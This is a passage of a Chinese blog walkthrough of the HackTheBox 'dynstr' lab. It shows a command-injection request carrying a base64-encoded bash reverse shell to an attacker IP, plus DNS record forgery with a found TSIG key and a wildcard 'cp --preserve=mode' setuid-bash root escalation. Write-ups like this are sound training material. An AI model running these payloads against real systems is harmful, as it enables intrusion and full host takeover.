+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019192113038.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211019192113038"></p>
+<p>我们不难推测整个接口对二进制文件的封装，底层调用了nsupdate对DNS进行升级。由此我们合理推测该接口存在命令注入。</p>
+<p>在对接口进行命令注入测试的过程中发现<code>.</code>的存在会干扰正常的解析（因<code>.</code>也被用来分割域名）：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211009123548168.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211009123548168"></p>
+<p>这里有两种方法进行绕过，一个是使用BASE64编码，一个是将IP地址使用16进制进行表示。这里使用的是第一种方法，最后构造出的数据包如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /nic/update?hostname=`echo+YmFzaCAtaSA%<span class="hljs-number">2</span>bJiAvZGV2L3RjcC8xMC4xMC4xNi4yMi80NDQ0IDA%<span class="hljs-number">2</span>bJjE%<span class="hljs-number">3</span>d+|+base64+-d+|+bash`%<span class="hljs-number">3</span>b753router.no-ip.htb&amp;myip=<span class="hljs-number">174.56.139.141</span>&amp;location=<span class="hljs-number">753</span>router HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.10.10.244</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux x86_64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">94</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4606</span>.<span class="hljs-number">81</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Authorization</span>: Basic ZHluYWRuczpzbmRhbnlk<br><br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>在攻击机上使用nc对4444端口进行监听，得到反弹的shell：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211016211543520.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211016211543520"></p>
+<h1 id="0x03-User-Shell"><a href="#0x03-User-Shell" class="headerlink" title="0x03 User Shell"></a>0x03 User Shell</h1><p>拿到shell我们可以先升级，升级成一个半完整的终端，后面使用<code>nsupdate</code>会方便一些：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>翻了一圈，最后找到home目录，有两个用户：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">www</span>-data@dynstr:/home$ ls -l<br><span class="hljs-attribute">ls</span> -l<br><span class="hljs-attribute">total</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">drwxr</span>-xr-x <span class="hljs-number">5</span> bindmgr bindmgr <span class="hljs-number">4096</span> Oct  <span class="hljs-number">8</span> <span class="hljs-number">14</span>:<span class="hljs-number">40</span> bindmgr<br><span class="hljs-attribute">drwxr</span>-xr-x <span class="hljs-number">3</span> dyna    dyna    <span class="hljs-number">4096</span> Mar <span class="hljs-number">18</span>  <span class="hljs-number">2021</span> dyna<br></code></pre></td></tr></table></figure>
+
+<p>dyna用户里面没有任何东西，进入<code>bindmgr</code>账户可以发现一个<code>support-case-C62796521</code>文件夹：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@dynstr</span><span class="hljs-symbol">:/home/bindmgr</span><span class="hljs-variable">$ </span>ls -l<br>ls -l<br>total <span class="hljs-number">1168</span><br>drwxr-xr-x <span class="hljs-number">2</span> bindmgr bindmgr    <span class="hljs-number">4096</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span>  <span class="hljs-number">2021</span> support-<span class="hljs-keyword">case</span>-<span class="hljs-title class_">C62796521</span><br>-r-------- <span class="hljs-number">1</span> bindmgr bindmgr      <span class="hljs-number">33</span> <span class="hljs-title class_">Oct</span>  <span class="hljs-number">8</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">27</span> user.txt<br></code></pre></td></tr></table></figure>
+
+
+
+<p>另外可能也可以看到一个二进制bash文件，这个可能是其他师傅留下的，可以直接拿到bindmgr的shell，我们不用去管他。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211009124510463.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211009124510463"></p>
+<p>在该目录下有如下文件，在<code>C62796521-debugging.script</code>中可以发现有泄露的ssh私钥：</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tap">www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -la<br>ls -la<br>total 436<br>drwxr-xr-x<span class="hljs-number"> 2 </span>bindmgr bindmgr  <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 13 </span><span class="hljs-number"> 2021 </span>.<br>drwxr-xr-x<span class="hljs-number"> 6 </span>bindmgr bindmgr  <span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 19 </span>09:48 ..<br>-rw-r--r--<span class="hljs-number"> 1 </span>bindmgr bindmgr<span class="hljs-number"> 237141 </span>Mar<span class="hljs-number"> 13 </span><span class="hljs-number"> 2021 </span>C62796521-debugging.script<br>-rw-r--r--<span class="hljs-number"> 1 </span>bindmgr bindmgr <span class="hljs-number"> 29312 </span>Mar<span class="hljs-number"> 13 </span><span class="hljs-number"> 2021 </span>C62796521-debugging.timing<br>-rw-r--r--<span class="hljs-number"> 1 </span>bindmgr bindmgr  <span class="hljs-number"> 1175 </span>Mar<span class="hljs-number"> 13 </span><span class="hljs-number"> 2021 </span>command-output-C62796521.txt<br>-rw-r--r--<span class="hljs-number"> 1 </span>bindmgr bindmgr<span class="hljs-number"> 163048 </span>Mar<span class="hljs-number"> 13 </span><span class="hljs-number"> 2021 </span>strace-C62796521.txt<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211016212958927.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211016212958927"></p>
+<p>保存该文件为<code>bindmgr</code>，尝试使用该私钥进行连接，失败：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019202621778.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211019202621778"></p>
+<p>经过对照确认私钥为正确的私钥（公钥文件可以去家目录的<code>.ssh</code>文件夹中读取）：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018214739959.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211018214739959"></p>
+<p>查看.ssh文件夹中的<code>authorized_keys</code>文件，可以发现该私钥限制了使用范围：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018211143850.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211018211143850"></p>
+<p>也就是我们需要将我们的IP纳入<code>*.infra.dyna.htb</code>的范围中，所以得利用box中的nsupdate命令增加dns记录：</p>
+<p>对于nsupdate相信很多人都是陌生的，这里最好的方法是去看网页是怎么做的。打开<code>update</code>文件能够找到调用的命令：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019203502840.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211019203502840"></p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018210950304.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211018210950304"></p>
+<p>要是对<code>$h</code>，<code>$d</code>两个参数有疑问的可以自己跑一下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ php -a                                                                130 ⨯<br>Interactive mode enabled<br><br>php &gt; list(<span class="hljs-variable">$h</span>,<span class="hljs-variable">$d</span>) = explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;test1.test2.com&quot;</span>,2);<br>php &gt; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$h</span>;<br>test1<br>php &gt; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$d</span>;<br>test2.com<br>php &gt; <br></code></pre></td></tr></table></figure>
+
+
+
+<p>一切准备就绪后可以直接调用nsupdate命令更新DNS记录：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nsupdate -t 1 -k /</span>etc<span class="hljs-regexp">/bind/</span>ddns.key<br></code></pre></td></tr></table></figure>
+
+<p>但是一开始会报错，一番尝试后发现是key不对。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018213244332.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211018213244332"></p>
+<p>在<code>ddns.key</code>的同级目录下能够找到真正能用的key，即<code>infra.key</code>：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018213417109.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211018213417109"></p>
+<p>首先增加正向解析的A记录：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">www-data@dynstr:<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>nic$ <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nsupdate -t 1 -k /</span>etc<span class="hljs-regexp">/bind/i</span>nfra.key<br>&lt;<span class="hljs-regexp">/nic$ /u</span>sr<span class="hljs-regexp">/bin/</span>nsupdate -t <span class="hljs-number">1</span> -k <span class="hljs-regexp">/etc/</span>bind/infra.key<br>&gt; server localhost<br>server localhost<br>&gt; zone dyna.htb<br>zone dyna.htb<br>&gt; update add h1nt.infra.dyna.htb <span class="hljs-number">30</span> IN A <span class="hljs-number">10.10</span>.<span class="hljs-number">16.33</span><br>update add h1nt.infra.dyna.htb <span class="hljs-number">30</span> IN A <span class="hljs-number">10.10</span>.<span class="hljs-number">16.33</span><br>&gt; send<br>send<br>&gt; <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018213646409.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211018213646409"></p>
+<p>使用<code>nslookup</code>命令验证成功添加：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018213734451.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211018213734451"></p>
+<p>但是我们还是不能使用私钥进行ssh连接，原因是ssh还会进行反向解析。可以参考stackoverflow的<a target="_blank" rel="noopener" href="https://serverfault.com/questions/206365/ssh-reverse-dns-lookup">一篇帖子</a>：</p>
+<p>无论原因如何，我们需要同样把反向解析记录给加上。</p>
+<p>首先可以使用nslookup看看需要添加的记录是什么。注意不是你的IP地址：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019204733872.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211019204733872"></p>
+<p>使用如下命令添加反向解析记录：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">www-data@dynstr:<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>nic$ <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nsupdate -t 1 -k /</span>etc<span class="hljs-regexp">/bind/i</span>nfra.key<br>&lt;<span class="hljs-regexp">/nic$ /u</span>sr<span class="hljs-regexp">/bin/</span>nsupdate -t <span class="hljs-number">1</span> -k <span class="hljs-regexp">/etc/</span>bind/infra.key<br>&gt; server localhost<br>server localhost<br>&gt; update add <span class="hljs-number">33.16</span>.<span class="hljs-number">10.10</span>.<span class="hljs-keyword">in</span>-addr.arpa <span class="hljs-number">30</span> IN PTR h1nt.infra.dyna.htb<br>update add <span class="hljs-number">33.16</span>.<span class="hljs-number">10.10</span>.<span class="hljs-keyword">in</span>-addr.arpa <span class="hljs-number">30</span> IN PTR h1nt.infra.dyna.htb<br>&gt; send<br>send<br>&gt; <br></code></pre></td></tr></table></figure>
+
+<p>而后再次使用nslookup进行验证：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018223740295.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211018223740295"></p>
+<p>添加成功后我们就能使用私钥进行连接了：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018223912951.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211018223912951"></p>
+<h1 id="0x04-Root-Shell"><a href="#0x04-Root-Shell" class="headerlink" title="0x04 Root Shell"></a>0x04 Root Shell</h1><p>连接上后尝试提权，使用<code>sudo -l</code>能够发现一个脚本：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019101601763.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211019101601763"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/bash</span><br><br><span class="hljs-comment"># This script generates named.conf.bindmgr to workaround the problem</span><br><span class="hljs-comment"># that bind/named can only include single files but no directories.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span><br><span class="hljs-comment"># from named.conf.local (or others) and will include all files from the</span><br><span class="hljs-comment"># directory /etc/bin/named.bindmgr.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> The script is work in progress. For now bind is not including</span><br><span class="hljs-comment">#       named.conf.bindmgr. </span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Currently the script is only adding files to the directory but</span><br><span class="hljs-comment">#       not deleting them. As we generate the list of files to be included</span><br><span class="hljs-comment">#       from the source directory they won&#x27;t be included anyway.</span><br><br>BINDMGR_CONF=/etc/bind/named.conf.bindmgr<br>BINDMGR_DIR=/etc/bind/named.bindmgr<br><br><span class="hljs-function"><span class="hljs-title">indent</span></span>() &#123; sed <span class="hljs-string">&#x27;s/^/    /&#x27;</span>; &#125;<br><br><span class="hljs-comment"># Check versioning (.version)</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Running <span class="hljs-variable">$0</span> to stage new configuration from <span class="hljs-variable">$PWD</span>.&quot;</span><br><span class="hljs-keyword">if</span> [[ ! -f .version ]] ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[-] ERROR: Check versioning. Exiting.&quot;</span><br>    <span class="hljs-built_in">exit</span> 42<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;`cat .version 2&gt;/dev/null`&quot;</span> -le <span class="hljs-string">&quot;`cat <span class="hljs-variable">$BINDMGR_DIR</span>/.version 2&gt;/dev/null`&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[-] ERROR: Check versioning. Exiting.&quot;</span><br>    <span class="hljs-built_in">exit</span> 43<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># Create config file that includes all files from named.bindmgr.</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Creating <span class="hljs-variable">$BINDMGR_CONF</span> file.&quot;</span><br><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;// Automatically generated file. Do not modify manually.\n&#x27;</span> &gt; <span class="hljs-variable">$BINDMGR_CONF</span><br><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> * ; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;include &quot;/etc/bind/named.bindmgr/%s&quot;;\n&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> &gt;&gt; <span class="hljs-variable">$BINDMGR_CONF</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># Stage new version of configuration files.</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Staging files to <span class="hljs-variable">$BINDMGR_DIR</span>.&quot;</span><br><span class="hljs-built_in">cp</span> .version * /etc/bind/named.bindmgr/<br><br><span class="hljs-comment"># Check generated configuration with named-checkconf.</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Checking staged configuration.&quot;</span><br>named-checkconf <span class="hljs-variable">$BINDMGR_CONF</span> &gt;/dev/null<br><span class="hljs-keyword">if</span> [[ $? -ne 0 ]] ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[-] ERROR: The generated configuration is not valid. Please fix following errors: &quot;</span><br>    named-checkconf <span class="hljs-variable">$BINDMGR_CONF</span> 2&gt;&amp;1 | indent<br>    <span class="hljs-built_in">exit</span> 44<br><span class="hljs-keyword">else</span> <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Configuration successfully staged.&quot;</span><br>    <span class="hljs-comment"># *** TODO *** Uncomment restart once we are live.</span><br>    <span class="hljs-comment"># systemctl restart bind9</span><br>    <span class="hljs-keyword">if</span> [[ $? -ne 0 ]] ; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[-] Restart of bind9 via systemctl failed. Please check logfile: &quot;</span><br>	systemctl status bind9<br>    <span class="hljs-keyword">else</span><br>	<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Restart of bind9 via systemctl succeeded.&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>这个脚本写得有纰漏的地方是它同时使用了<code>cp</code>命令和通配符<code>*</code>，我们可以利用它进行权限提升。原理是cp命令会改变文件的属主，以及cp命令可以设置保留文件的权限位，配合setuid标志位就能够拿到root的shell。</p>
+<p>首先我们可以新建一个文件夹，配置好<code>.version</code>文件，而后将<code>bash</code>复制到当前文件夹中。</p>
+<p>之后新建一个文件，名字为<code>--preserve=mode</code>，这个命令可以在保留复制后的文件的权限位。关于更多的解释可以使用<code>man</code>命令进行详细查看。</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">touch</span> <span class="hljs-literal">--</span> <span class="hljs-literal">--</span><span class="hljs-comment">preserve=mode</span><br></code></pre></td></tr></table></figure>
+
+<p>创建后的三个文件如下：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019155725154.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211019155725154"></p>
+<p>之后使用chmod给bash设置setuid标志位：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">4755</span> bash<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019155812638.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211019155812638"></p>
+<p>接着便可以跑脚本了：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>bindmgr.sh<br></code></pre></td></tr></table></figure>
+
+<p>在设置的目录下即可看到一个设置了setuid标志位的属主为root的bash：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019155849032.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211019155849032"></p>
+<p>使用该bash即可启动一个root的shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./bash -p<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019155921666.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211019155921666"></p>
+<p>自此，整个Box拿下！</p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HackTheBox/">#HackTheBox</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox - dynstr</div>
+      <div>https://m0ck1ng-b1rd.github.io/2021/12/07/HTB/dynstr/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>何语灵</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年12月7日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/12/07/HTB/StartingPoint-Pathfinder/" title="HackTheBox - StartingPoint-Pathfinder">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox - StartingPoint-Pathfinder</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80/" title="红队评估一记录">
+                        <span class="hidden-mobile">红队评估一记录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'M0cK1nG-b1Rd/blog-comments');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
